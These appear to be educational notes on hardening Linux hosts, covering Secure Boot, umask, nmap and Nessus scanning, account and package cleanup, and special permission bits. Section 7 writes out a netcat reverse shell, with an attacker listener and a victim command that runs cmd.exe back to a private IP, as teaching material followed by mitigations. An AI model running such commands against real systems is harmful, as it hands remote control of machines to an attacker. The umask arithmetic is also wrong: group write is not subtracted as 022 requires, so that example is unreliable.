# Securing Linux

## 1. Linux Hardening

**Linux Hardening Techniques**

1. **Reduce Attack Surface**  
   Focus on minimizing potential attack vectors for malicious actors.

2. **Manual Hardening**  
   Edit configuration files, disable unnecessary components, and reset weak passwords directly on Linux hosts.

3. **Centralized Management**  
   Use tools like Ansible or Puppet for deploying standard configurations across multiple hosts and to detect configuration drift.

4. **Firmware and Software Updates**  
   - Apply firmware updates for hardware.  
   - For software updates on Debian-based systems, use:
     - `sudo apt-get update` to refresh the package repository list.
     - `sudo apt-get upgrade` to update installed packages.

5. **Complex Passwords**  
   Enforce complex passwords if using username/password authentication. Prefer SSH public key authentication to enhance security.

6. **Disallow Root Logins**  
   Disable direct SSH logins for the root account. Use `su` to switch to the root user after logging in as a different user.

7. **Disable Unused Services**  
   Remove or stop unnecessary services (e.g., web servers) to reduce the attack surface.

8. **Remote Management Security**  
   Use jump boxes, VPNs, or SSH tunneling for remote access to prevent direct exposure of Linux hosts over the Internet.

9. **Logging and Monitoring**  
   - Configure logging appropriately and enable log forwarding to a centralized logging host.
   - Employ continuous monitoring, using SIEM solutions for automated analysis of logs.

10. **Encryption**  
    - Use secured connections (e.g., HTTPS, VPN, SSH tunneling) for network-level encryption.
    - Encrypt local storage with tools like dm-crypt or LUKS.

11. **Host-based Firewalls**  
    Implement host-based firewalls to control incoming and outgoing traffic on each Linux host.

12. **Intrusion Detection and Prevention Systems (IDPS)**  
    Install tools like Snort for host-based intrusion detection and prevention.

Implementing these techniques collectively enhances the security posture of Linux hosts and reduces their vulnerability to attacks.

## 2. Managing Unified Extensible Firmware Interface

**Unified Extensible Firmware Interface (UEFI)**

- **Overview**: UEFI replaces the older BIOS standard and has been in use since 2010. It initializes hardware components during device startup and checks memory and storage devices.

- **Advantages of UEFI**:
  - Supports larger disks compared to BIOS.
  - Features a graphical user interface (GUI) for management.
  - Includes Secure Boot functionality for enhanced security.

- **Accessing UEFI Settings**:
  - Press a specific key combination (e.g., Ctrl+E or F2) during startup to enter UEFI settings.
  - Configure settings such as Secure Boot and RAID configurations.

- **Secure Boot**:
  - Purpose: Ensures that only digitally signed and trusted drivers and operating system files load.
  - Prevents malicious software, like rootkits, from running by verifying digital signatures.
  - Uses an allow and deny signature database, storing public keys of trusted certificate authorities (CAs).

- **Considerations for Secure Boot**:
  - Existing operating systems must be installed in UEFI mode with Secure Boot enabled for compatibility.
  - Ensure that the Linux distribution supports UEFI Secure Boot, as not all versions do.

- **Installing Linux with Secure Boot**:
  - If the Linux distribution supports Secure Boot, it can be installed with this feature enabled.
  - A boot/efi partition will be created (e.g., /dev/sda) during installation.

- **Checking Secure Boot Status**:
  - Use the command `mokutil --sb-state` to verify if Secure Boot is enabled.

- **Security Benefits**:
  - Enabling UEFI Secure Boot in high-security environments helps prevent the installation of malicious files and enhances overall system hardening.

## 3. Setting Default File System Permissions with umask

**Umask in Linux**

- **Definition**: Umask (user file-creation mode mask) controls the default permissions set for new files and directories in Linux.

- **Default Permissions**: 
  - When a file is created, Linux assigns default permissions (e.g., 666 for files, which means read-write for owner, group, and others).
  - The umask value subtracts permissions from these defaults.

- **Umask Calculation**:
  - For example, if the default is 666 and the umask is 022:
    - Owner: 6 (read-write) - 0 = 6 (read-write)
    - Group: 6 (read-write) - 0 = 6 (read-write)
    - Others: 6 (read-write) - 2 = 4 (read)
  - Resulting permissions for a new file would be **rw-rw-r--**.

- **Changing Umask**:
  - To restrict permissions further, you can modify the umask. For instance, to prevent others from having any permissions:
    - Set umask to 006.
    - Now, for a new file:
      - Owner: 6 (read-write) - 0 = 6
      - Group: 6 (read-write) - 0 = 6
      - Others: 6 (read-write) - 6 = 0 (no permissions)
    - Resulting permissions would be **rw-rw----**.

- **Setting Umask in Configuration Files**:
  - To make umask settings persistent, add the umask command to your `.bashrc` file:
    - Open the file: `sudo nano ~/.bashrc`
    - Add the line: `umask 006`
    - Save and exit.

- **Testing Umask Changes**:
  - After modifying `.bashrc`, use `su -` to create a new session and check the umask. It should reflect your changes.

- **Security Implications**:
  - Setting a restrictive umask helps prevent unauthorized access to files created by a user, improving overall security in a multi-user environment.

## 4. Scanning Linux Hosts for Open Ports

**Nmap Scanning on Linux**

1. **Overview**: Nmap is a powerful tool used to scan Linux hosts for open ports.

2. **Installing Nmap**:
   - Use the command: `sudo apt install nmap` to install if it's not already available.

3. **Checking IP Address**:
   - Run `ip a` to find the server's IP address (e.g., `192.168.2.156`).

4. **Basic Nmap Usage**:
   - To scan a single host:  
     `sudo nmap 192.168.2.156`  
     This will show open ports and services (e.g., SSH on port 22, DNS on port 53).

5. **Scanning Multiple Hosts**:
   - You can specify multiple IP addresses separated by spaces:  
     `sudo nmap 192.168.2.156 192.168.2.1`.

6. **Scanning a Range of Hosts**:
   - To scan all hosts in a subnet:  
     `sudo nmap 192.168.2.*`.  
     This will take longer but reveals all responding devices.

7. **Identifying Services**:
   - The output will display services running on each host, including any insecure ones (e.g., Telnet).

8. **Output to File**:
   - Redirect output to a file for later review:  
     `sudo nmap 192.168.2.* > nmap_scan_results.txt`.

9. **Checking Live Hosts**:
   - To see which hosts are active without scanning ports:  
     `sudo nmap -sP 192.168.2.*`.

10. **Scanning Specific Ports**:
    - To check for a specific service like Telnet (port 23):  
      `sudo nmap -p 23 192.168.2.*`.

11. **OS Fingerprinting**:
    - Use the `-O` option for OS detection:  
      `sudo nmap -O 192.168.2.156`.  
      This attempts to identify the operating system running on the host.

12. **Interpreting Results**:
    - Open ports are critical for security assessment; closed ports are less concerning. If a known insecure service (like Telnet) is found open, it should be investigated.

By following these steps, you can effectively use Nmap to assess the security posture of your Linux hosts.

## 5. Assessing Linux Security

### Vulnerability Scanning with Tenable Nessus

1. **Purpose**:
   - Assess host security by identifying vulnerabilities without exploiting them.
   - Differentiate from penetration testing, which actively exploits vulnerabilities.

2. **Tools Available**:
   - Tenable Nessus: A network vulnerability scanner.
   - Other options include OpenVAS and various commercial tools.

3. **Downloading Nessus**:
   - Visit [Tenable's website](https://www.tenable.com) to download a trial version.
   - Nessus can be installed on multiple platforms (Linux, Windows, Docker).

4. **Accessing Nessus**:
   - After installation, connect via a web browser at `https://localhost:8834`.
   - Use your set credentials to log in.

5. **Scanning Setup**:
   - Specify the target IP (e.g., `192.168.2.156`).
   - Choose the scan type (e.g., Basic Network Scan) and initiate the scan.

6. **Scan Results**:
   - Review the scan summary, which may include vulnerabilities categorized by severity (e.g., informational, low, medium).
   - Click on the vulnerabilities tab for detailed information (e.g., DNS issues).

7. **Scan Templates**:
   - Nessus offers various scan templates for different needs, including malware, web application testing, and compliance checks (e.g., PCI DSS).

8. **Keeping Nessus Updated**:
   - Regularly check for updates to the vulnerability database via the Settings > Software Update tab.

9. **Advanced Scanning**:
   - Create advanced scans with specific settings, including scheduling and credential inputs for deeper insights.
   - Input credentials (e.g., SSH) for more comprehensive scanning, simulating an internal attack perspective.

10. **Compliance and Plugin Management**:
    - Assess compliance with security standards via the Compliance tab.
    - Manage plugins to tailor the scan focus according to your needs.

11. **Regular Scanning**:
    - Vulnerability scanning should be a routine part of your security strategy.
    - Frequency depends on organizational policies but should be periodic to maintain an updated security posture.

By utilizing Nessus effectively, organizations can identify potential vulnerabilities and take proactive steps to secure their environments.

## 6. Disabling and Removing Unnecessary Components

### Hardening Linux Hosts by Reducing Attack Surface

1. **Concept of Attack Surface**:
   - Reducing the attack surface means minimizing the number of potential vulnerabilities that could be exploited by malicious actors.

2. **User Account Management**:
   - Check existing user accounts:
     - Use `sudo tail /etc/passwd` to view accounts.
     - Run `sudo last` to see login history, including active connections and timestamps.
     - Use `sudo who` to check current logged-in users.
     - Run `sudo lastlog` to identify accounts that haven’t been used.
   - **Actions**:
     - Disable unnecessary accounts with `sudo passwd -l username`.
     - Remove accounts permanently with `sudo userdel username`.

3. **Software Package Management**:
   - Identify installed packages:
     - Run `sudo apt list` to see all installed software.
     - Use `grep` to filter specific packages (e.g., `sudo apt list | grep python`).
   - Check running processes:
     - Use `sudo ps -aux` to list all active processes.
     - Identify unnecessary services to consider removing (e.g., `sudo apt remove apache2`).

4. **Uninstalling Unnecessary Software**:
   - Removing unneeded software not only frees disk space but also reduces potential vulnerabilities. For example, running a web server on a system where it’s not needed poses a security risk.

5. **Managing Linux Client Devices**:
   - Ensure Linux client machines are also secure:
     - Use a configuration management tool (e.g., Puppet, Chef, Ansible) for centralized management.
   - On Ubuntu desktop:
     - Open the **Ubuntu Software** application to view installed software.
     - Check the **Installed** tab for easy uninstallation.
     - Regularly check for updates and apply them to keep the system secure.

6. **Centralized Management**:
   - In larger environments, central management is crucial for scalability.
   - Use tools to manage software installation, updates, and security configurations across multiple machines.

7. **Ongoing Security Practices**:
   - Regularly audit user accounts and installed software.
   - Keep software updated to protect against known vulnerabilities.
   - Continuously review and adjust the configuration as needed to maintain a secure environment.

By implementing these practices, you can effectively harden your Linux hosts and create a more secure system environment.

## 7. Configuring a Linux Reverse Shell

### Understanding and Mitigating Reverse Shells

#### What is a Reverse Shell?
- A reverse shell allows an attacker to gain remote access to a victim's machine by establishing a connection from the victim to the attacker's system.
- The attacker sets up a listener on their machine, usually on a common port (like port 80), to receive incoming connections.

#### Setting Up a Reverse Shell with Netcat
1. **Attacker's Side (Listener Setup)**:
   - On the attacker's Linux machine, you can set up a listener using Netcat:
     ```bash
     sudo nc -l -v -p 80
     ```
   - This command makes the attacker’s machine listen on all IP addresses (`0.0.0.0`) on port 80 for incoming connections.

2. **Victim's Side (Connecting to Listener)**:
   - On the victim’s Windows machine, use Netcat to connect back to the attacker:
     ```powershell
     ./nc64 192.168.2.156 80 -e cmd.exe
     ```
   - This command tells Netcat to connect to the attacker’s IP address and execute a command prompt (`cmd.exe`) that sends input and output over the established connection.

#### Behavior of a Reverse Shell
- From the victim’s perspective, the outgoing connection looks like normal web traffic, which is often overlooked by firewalls and security systems.
- The attacker gains control of the victim's command prompt, allowing them to run commands as if they were sitting in front of the victim's computer.

#### Security Implications
- **Detection Challenges**: Since the connection appears as outbound HTTP traffic, it may evade detection unless specific monitoring tools are in place.
- **Potential Actions**: The attacker can execute commands, access files, and manipulate the victim’s system remotely.

#### Mitigation Strategies
1. **Network Monitoring**:
   - Deploy threat-hunting tools that can analyze outgoing traffic patterns. Look for unusual connections, especially on common ports like 80.
   - Implement intrusion detection systems (IDS) to flag unexpected outbound connections.

2. **Endpoint Protection**:
   - Ensure all machines have up-to-date antivirus and anti-malware solutions that can detect suspicious activities, including the use of tools like Netcat.

3. **User Education**:
   - Train users to recognize phishing attempts and malicious links that could lead to the execution of reverse shells.

4. **Firewall Configurations**:
   - Configure firewalls to restrict outbound traffic to known, safe destinations, and monitor unusual access patterns.

5. **Regular Audits**:
   - Conduct regular audits of user accounts, installed software, and network configurations to identify and remediate potential vulnerabilities.

#### Conclusion
Understanding how reverse shells operate is crucial for implementing effective security measures. By proactively monitoring network traffic, securing endpoints, and educating users, organizations can significantly reduce the risk of falling victim to these types of attacks.

## 8. Managing Advanced File System Permissions

### Managing Advanced File System Permissions in Linux

In this demonstration, we'll explore advanced file system permissions in Linux, specifically focusing on the **sticky bit**, **SUID**, and **SGID** bits. These permissions enhance security in shared environments by controlling how files can be accessed and executed.

---

#### 1. The Sticky Bit

- **Purpose**: The sticky bit ensures that only the owner of a file can delete or rename their files within a shared directory, preventing others from doing so even if they have write permissions.

**Steps to Set the Sticky Bit**:
1. **Create a Shared Directory**:
   ```bash
   sudo mkdir shared_files
   ```

2. **Set Permissions**:
   ```bash
   sudo chmod o+w shared_files
   ```

3. **Set the Sticky Bit**:
   ```bash
   sudo chmod +t shared_files
   ```

4. **Verify the Permissions**:
   ```bash
   ls -ld shared_files
   ```
   - Output will show a `t` at the end of the permissions string, indicating the sticky bit is set.

---

#### 2. The User ID Bit (SUID)

- **Purpose**: The SUID bit allows users to execute a file with the permissions of the file's owner, typically used for programs that require elevated privileges.

**Steps to Set the SUID Bit**:
1. **Create a Script**:
   ```bash
   sudo touch shared_files/script1.sh
   ```

2. **Set the SUID Bit**:
   ```bash
   sudo chmod u+s shared_files/script1.sh
   ```

3. **Verify the Permissions**:
   ```bash
   ls -l shared_files/script1.sh
   ```
   - The `S` in the owner’s permission indicates the SUID is set.

4. **Grant Execute Permission**:
   ```bash
   sudo chmod u+x shared_files/script1.sh
   ```

5. **Recheck Permissions**:
   ```bash
   ls -l shared_files/script1.sh
   ```
   - Now, it should display a lowercase `s`, confirming that the script will run with the owner's permissions.

---

#### 3. The Group ID Bit (SGID)

- **Purpose**: The SGID bit allows files to be executed with the permissions of the group owner, enabling shared access within a group.

**Steps to Set the SGID Bit**:
1. **Change Group Ownership**:
   ```bash
   sudo chgrp eastadmins shared_files/script1.sh
   ```

2. **Set the SGID Bit**:
   ```bash
   sudo chmod g+s shared_files/script1.sh
   ```

3. **Verify Permissions**:
   ```bash
   ls -l shared_files/script1.sh
   ```
   - An `S` in the group permissions indicates the SGID is set.

---

#### 4. Numeric Permission Values

- Understanding numeric values can be useful when setting permissions in one command.
  - **Sticky Bit**: 1
  - **SUID Bit**: 4
  - **SGID Bit**: 2

**Example of Setting Permissions with Numeric Values**:
```bash
sudo chmod 1660 shared_files/script1.sh
```
- Here, `1` sets the sticky bit, `6` (4+2) gives read and write permissions to the user, `6` (4+2) gives read and write permissions to the group, and `0` denies permissions to others.

**Verify Permissions**:
```bash
ls -l shared_files/script1.sh
```
- The output should show the correct permissions reflecting the numeric values set.

---

### Conclusion

By mastering these advanced permissions—sticky bit, SUID, and SGID—you can enhance security in shared directories and control access more effectively in a Linux environment. These settings are vital for managing multi-user systems, ensuring users have the necessary access without compromising security.

